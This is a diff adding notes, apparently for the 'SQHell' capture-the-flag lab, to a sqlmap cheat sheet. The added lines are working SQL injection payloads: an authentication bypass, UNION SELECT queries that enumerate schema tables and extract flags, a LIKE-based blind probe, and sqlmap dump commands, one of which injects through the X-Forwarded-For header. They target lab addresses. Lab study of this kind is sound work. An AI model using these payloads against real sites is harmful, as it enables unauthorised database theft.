@@ -155,4 +155,32 @@ This option can be used to set the verbosity level of output messages. There exi
 # WAF
 
         sqlmap --list -tempers
-        sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --level 2 --risk 2 --tamper='uppercase.py' -v 4 
+        sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --level 2 --risk 2 --tamper='uppercase.py' -v 4
+
+
+
+
+
+
+
+# hqhell - >
+        Lab number 1
+        admin OR 1=1--
+
+        Lab number 5
+        http://10.10.165.23/post?id=2 AND 1=2 UNION SELECT 1, COLUMN_NAME, 3, 4 FROM information_schema.columns WHERE table_name = 'flag' limit 2, 1--
+
+        http://10.10.165.23/post?id=2 AND 1=2 UNION%20 SELECT 1, TABLE_NAME, 3, 4 FROM information_schema.tables WHERE table_schema ='sqhell_5'--
+
+        AND 1=2 UNION SELECT 1,2, flag, 4 FROM flag--
+
+        Lab number 3
+        http://10.10.7.103/register/user-check?username=admin' UNION SELECT 1, 2, 3 FROM flag WHERE flag LIKE T%25
+
+        sqlmap -u http://10.10.7.103/register/user-check?username=admin --dump
+
+        Lab number 2
+        sqlmap -u url --headers="X-Forwarded-For:1*" --dump --batch
+
+        lAB NUMBER 4
+        AND 1=2 union all select '1 UNION SELECT 1,flag,3,4 from flag-- -',2,3 from sqhell_4.users LIMIT 0,1--
